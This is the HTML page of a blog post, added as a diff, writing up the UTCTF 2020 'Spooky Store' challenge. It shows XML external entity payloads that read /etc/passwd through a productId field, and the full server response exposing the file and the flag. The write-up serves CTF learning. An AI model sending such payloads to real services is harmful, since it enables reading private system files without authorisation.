@@ -1,0 +1,335 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@1.207/distr/fira_code.css">
+
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">
+
+  <link rel="stylesheet" type="text/css" href="/theme/pygments/rrt.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/solid.css">
+
+
+    <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="securitytaters Atom">
+
+
+
+
+
+<meta name="author" content="0xm4v3rick" />
+<meta name="description" content="XXE challenge that involved using already available XML tag" />
+<meta name="keywords" content="webappsec, XXE, writeup">
+
+
+<meta property="og:site_name" content="securitytaters"/>
+<meta property="og:title" content="Solving Spooky Store from UTCTF 2020"/>
+<meta property="og:description" content="XXE challenge that involved using already available XML tag"/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="/solving-spooky-store-from-utctf-2020.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2020-03-09 08:00:00+05:30"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="/author/0xm4v3rick.html">
+<meta property="article:section" content="CTF"/>
+<meta property="article:tag" content="webappsec"/>
+<meta property="article:tag" content="XXE"/>
+<meta property="article:tag" content="writeup"/>
+<meta property="og:image" content="">
+
+  <title>securitytaters &ndash; Solving Spooky Store from UTCTF 2020</title>
+
+</head>
+<body>
+  <aside>
+    <div id='blah'>
+
+<h1><a style="font-weight:bold;font-size:xx-large" href="https://securitytaters.info">securitytaters</a></h1>
+<hr>
+    </div>
+
+    <div style="margin-top: -90px;">
+      <h1><a href=""></a></h1>
+
+
+      <nav>
+        <ul class="list">
+
+	<h2>0xm4v3rick</h2>
+            <li><a target="_blank" href="https://twitter.com/0xm4v3rick" >Twitter</a></li>
+            <li><a target="_blank" href="https://github.com/0xm4v3rick" >Github</a></li>
+
+	<h2>0xshrimantyogi</h2>
+            <li><a target="_blank" href="https://twitter.com/0xshrimantyogi" >Twitter</a></li>
+            <li><a target="_blank" href="https://github.com/0xshrimantyogi" >Github</a></li>
+
+        </ul>
+      </nav>
+
+      <ul class="social">
+          <li>
+            <a  class="sc-Git" href="#" target="_blank">
+            <i class="fab fa-Git">
+            </i>
+
+          </a></li>
+          <li>
+            <a  class="sc-Another social link" href="#" target="_blank">
+            <i class="fab fa-Another social link">
+            </i>
+
+          </a></li>
+      </ul>
+ 					<h2><a href="/archives.html">Archives</a></h2> <br/>
+					<h2><a href="/authors.html">Authors</a></h2>
+</br>
+<h3 style="color: #00ff28;"><b>This site uses Fira Code so the code will not appear as usual but it will work if you copy and use it directly.</b></h3>
+    </div>
+
+
+  </aside>
+  <main>
+
+
+<article class="single">
+  <header>
+      
+    <h1 id="solving-spooky-store-from-utctf-2020">Solving Spooky Store from UTCTF 2020</h1>
+    <p>
+          Posted on Mon 09 March 2020 in <a href="/category/ctf.html">CTF</a>
+
+by <a href="0xm4v3rick.html">0xm4v3rick</a>
+    </p>
+  </header>
+<hr>
+
+  <div>
+    <p>The CTF challenge was a below.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">It</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">a</span> <span class="k">simple</span> <span class="n">webpage</span> <span class="k">with</span> <span class="mi">3</span> <span class="n">buttons</span><span class="p">,</span> <span class="n">you</span> <span class="n">got</span> <span class="n">this</span> <span class="p">:)</span>
+
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">web1</span><span class="p">.</span><span class="n">utctf</span><span class="p">.</span><span class="n">live</span><span class="p">:</span><span class="mi">5005</span><span class="o">/</span>
+
+<span class="k">by</span> <span class="n">matt</span>
+</pre></div>
+</td></tr></table>
+
+<p>Opening the challenge URL shows a page with 3 locations and an option to <strong>Check Nearest Location</strong> on each. Clicking on one of them, generated following request and response.</p>
+<p>Request:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/location</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">web1.utctf.live:5005</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://web1.utctf.live:5005/</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/xml</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://web1.utctf.live:5005</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">93</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+
+<span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="nt">&lt;locationCheck&gt;&lt;productId&gt;</span>1<span class="nt">&lt;/productId&gt;&lt;/locationCheck&gt;</span>
+</pre></div>
+</td></tr></table>
+
+<p>Response:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7
+8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">HTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span> <span class="nt">200</span> <span class="nt">OK</span>
+<span class="nt">Content-Type</span><span class="o">:</span> <span class="nt">text</span><span class="o">/</span><span class="nt">html</span><span class="o">;</span> <span class="nt">charset</span><span class="o">=</span><span class="nt">utf-8</span>
+<span class="nt">Date</span><span class="o">:</span> <span class="nt">Sat</span><span class="o">,</span> <span class="nt">07</span> <span class="nt">Mar</span> <span class="nt">2020</span> <span class="nt">08</span><span class="p">:</span><span class="nd">58</span><span class="p">:</span><span class="nd">01</span> <span class="nt">GMT</span>
+<span class="nt">Server</span><span class="o">:</span> <span class="nt">Werkzeug</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">Python</span><span class="o">/</span><span class="nt">3</span><span class="p">.</span><span class="nc">8</span><span class="p">.</span><span class="nc">1</span>
+<span class="nt">Content-Length</span><span class="o">:</span> <span class="nt">60</span>
+<span class="nt">Connection</span><span class="o">:</span> <span class="nt">Close</span>
+
+<span class="nt">The</span> <span class="nt">nearest</span> <span class="nt">coordinates</span> <span class="nt">to</span> <span class="nt">you</span> <span class="nt">are</span><span class="o">:</span> <span class="nt">25</span><span class="p">.</span><span class="nc">0000</span><span class="err">Â°</span> <span class="nt">N</span><span class="o">,</span> <span class="nt">71</span><span class="p">.</span><span class="nc">0000</span><span class="err">Â°</span> <span class="nt">W</span>
+</pre></div>
+</td></tr></table>
+
+<p>Post request body contains XML data so there is a big chance of XML related issues and it did smell like XXE ;). So I searched around for some payloads that I could use and landed <a href="https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xml-attacks.txt">here</a>. Using some of the payloads directly did not result in anything interesting, so it was time to step back and think.  </p>
+<p>As it turned out, I needed to use already available <strong>&lt;productId></strong> tag to reference the entity. The initial payload which included random tag <strong>&lt;blah></strong> as below did not work. </p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span> ]&gt;<span class="nt">&lt;blah&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/blah&gt;</span>
+</pre></div>
+</td></tr></table>
+
+<p>But this payload below did work using the already available tag.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span> ]&gt;<span class="nt">&lt;blah&gt;&lt;productId&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/productId&gt;&lt;/blah&gt;</span>
+</pre></div>
+</td></tr></table>
+
+<p>Another payload that earned the same results was</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span> ]&gt;<span class="nt">&lt;locationCheck&gt;&lt;productId&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/productId&gt;&lt;/locationCheck&gt;</span>
+</pre></div>
+</td></tr></table>
+
+<p>So the final request was generated to get the flag on the last line of response looked like this.</p>
+<p>Request:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/location</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">web1.utctf.live:5005</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://web1.utctf.live:5005/</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/xml</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://web1.utctf.live:5005</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">175</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+
+<span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span> ]&gt;<span class="nt">&lt;locationCheck&gt;&lt;productId&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/productId&gt;&lt;/locationCheck&gt;</span>
+</pre></div>
+</td></tr></table>
+
+<p>Response:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">HTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span> <span class="nt">200</span> <span class="nt">OK</span>
+<span class="nt">Content-Type</span><span class="o">:</span> <span class="nt">text</span><span class="o">/</span><span class="nt">html</span><span class="o">;</span> <span class="nt">charset</span><span class="o">=</span><span class="nt">utf-8</span>
+<span class="nt">Date</span><span class="o">:</span> <span class="nt">Sat</span><span class="o">,</span> <span class="nt">07</span> <span class="nt">Mar</span> <span class="nt">2020</span> <span class="nt">05</span><span class="p">:</span><span class="nd">54</span><span class="p">:</span><span class="nd">36</span> <span class="nt">GMT</span>
+<span class="nt">Server</span><span class="o">:</span> <span class="nt">Werkzeug</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">Python</span><span class="o">/</span><span class="nt">3</span><span class="p">.</span><span class="nc">8</span><span class="p">.</span><span class="nc">1</span>
+<span class="nt">Content-Length</span><span class="o">:</span> <span class="nt">1234</span>
+<span class="nt">Connection</span><span class="o">:</span> <span class="nt">Close</span>
+
+<span class="nt">Invalid</span> <span class="nt">ProductId</span><span class="o">:</span> <span class="nt">root</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">0</span><span class="p">:</span><span class="nd">0</span><span class="p">:</span><span class="nd">root</span><span class="o">:/</span><span class="nt">root</span><span class="o">:/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">ash</span>
+<span class="nt">bin</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">1</span><span class="p">:</span><span class="nd">1</span><span class="p">:</span><span class="nd">bin</span><span class="o">:/</span><span class="nt">bin</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">daemon</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">2</span><span class="p">:</span><span class="nd">2</span><span class="p">:</span><span class="nd">daemon</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">adm</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">3</span><span class="p">:</span><span class="nd">4</span><span class="p">:</span><span class="nd">adm</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">adm</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">lp</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">4</span><span class="p">:</span><span class="nd">7</span><span class="p">:</span><span class="nd">lp</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">spool</span><span class="o">/</span><span class="nt">lpd</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">sync</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">5</span><span class="p">:</span><span class="nd">0</span><span class="p">:</span><span class="nd">sync</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">:/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">sync</span>
+<span class="nt">shutdown</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">6</span><span class="p">:</span><span class="nd">0</span><span class="p">:</span><span class="nd">shutdown</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">shutdown</span>
+<span class="nt">halt</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">7</span><span class="p">:</span><span class="nd">0</span><span class="p">:</span><span class="nd">halt</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">halt</span>
+<span class="nt">mail</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">8</span><span class="p">:</span><span class="nd">12</span><span class="p">:</span><span class="nd">mail</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">mail</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">news</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">9</span><span class="p">:</span><span class="nd">13</span><span class="p">:</span><span class="nd">news</span><span class="o">:/</span><span class="nt">usr</span><span class="o">/</span><span class="nt">lib</span><span class="o">/</span><span class="nt">news</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">uucp</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">10</span><span class="p">:</span><span class="nd">14</span><span class="p">:</span><span class="nd">uucp</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">spool</span><span class="o">/</span><span class="nt">uucppublic</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">operator</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">11</span><span class="p">:</span><span class="nd">0</span><span class="p">:</span><span class="nd">operator</span><span class="o">:/</span><span class="nt">root</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">man</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">13</span><span class="p">:</span><span class="nd">15</span><span class="p">:</span><span class="nd">man</span><span class="o">:/</span><span class="nt">usr</span><span class="o">/</span><span class="nt">man</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">postmaster</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">14</span><span class="p">:</span><span class="nd">12</span><span class="p">:</span><span class="nd">postmaster</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">mail</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">cron</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">16</span><span class="p">:</span><span class="nd">16</span><span class="p">:</span><span class="nd">cron</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">spool</span><span class="o">/</span><span class="nt">cron</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">ftp</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">21</span><span class="p">:</span><span class="nd">21</span><span class="o">::/</span><span class="nt">var</span><span class="o">/</span><span class="nt">lib</span><span class="o">/</span><span class="nt">ftp</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">sshd</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">22</span><span class="p">:</span><span class="nd">22</span><span class="p">:</span><span class="nd">sshd</span><span class="o">:/</span><span class="nt">dev</span><span class="o">/</span><span class="nt">null</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">at</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">25</span><span class="p">:</span><span class="nd">25</span><span class="p">:</span><span class="nd">at</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">spool</span><span class="o">/</span><span class="nt">cron</span><span class="o">/</span><span class="nt">atjobs</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">squid</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">31</span><span class="p">:</span><span class="nd">31</span><span class="p">:</span><span class="nd">Squid</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">cache</span><span class="o">/</span><span class="nt">squid</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">xfs</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">33</span><span class="p">:</span><span class="nd">33</span><span class="p">:</span><span class="nd">X</span> <span class="nt">Font</span> <span class="nt">Server</span><span class="o">:/</span><span class="nt">etc</span><span class="o">/</span><span class="nt">X11</span><span class="o">/</span><span class="nt">fs</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">games</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">35</span><span class="p">:</span><span class="nd">35</span><span class="p">:</span><span class="nd">games</span><span class="o">:/</span><span class="nt">usr</span><span class="o">/</span><span class="nt">games</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">cyrus</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">85</span><span class="p">:</span><span class="nd">12</span><span class="o">::/</span><span class="nt">usr</span><span class="o">/</span><span class="nt">cyrus</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">vpopmail</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">89</span><span class="p">:</span><span class="nd">89</span><span class="o">::/</span><span class="nt">var</span><span class="o">/</span><span class="nt">vpopmail</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">ntp</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">123</span><span class="p">:</span><span class="nd">123</span><span class="p">:</span><span class="nd">NTP</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">empty</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">smmsp</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">209</span><span class="p">:</span><span class="nd">209</span><span class="p">:</span><span class="nd">smmsp</span><span class="o">:/</span><span class="nt">var</span><span class="o">/</span><span class="nt">spool</span><span class="o">/</span><span class="nt">mqueue</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">guest</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">405</span><span class="p">:</span><span class="nd">100</span><span class="p">:</span><span class="nd">guest</span><span class="o">:/</span><span class="nt">dev</span><span class="o">/</span><span class="nt">null</span><span class="o">:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">nobody</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">65534</span><span class="p">:</span><span class="nd">65534</span><span class="p">:</span><span class="nd">nobody</span><span class="o">:/:/</span><span class="nt">sbin</span><span class="o">/</span><span class="nt">nologin</span>
+<span class="nt">utctf</span><span class="p">:</span><span class="nd">x</span><span class="p">:</span><span class="nd">1337</span><span class="p">:</span><span class="nd">utflag</span><span class="p">{</span><span class="err">n3xt_y3ar_go1ng_bl1nd</span><span class="p">}</span>
+</pre></div>
+</td></tr></table>
+
+<p>That's it. Finally thanks to UTCTF Team for the chall. Feel free to contact me on twitter for queries or feedback. Cheers!!</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="/tag/webappsec.html">webappsec</a>
+      <a href="/tag/xxe.html">XXE</a>
+      <a href="/tag/writeup.html">writeup</a>
+    </p>
+  </div>
+
+
+
+
+
+</article>
+
+    <footer>
+<p>&copy;  </p>
+<p>    Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+
+<br> &copy; Copyright 2020, securitytaters.info
+</p>    </footer>
+  </main>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " securitytaters ",
+  "url" : "",
+  "image": "",
+  "description": ""
+}
+</script>
+
+</body>
+</html>
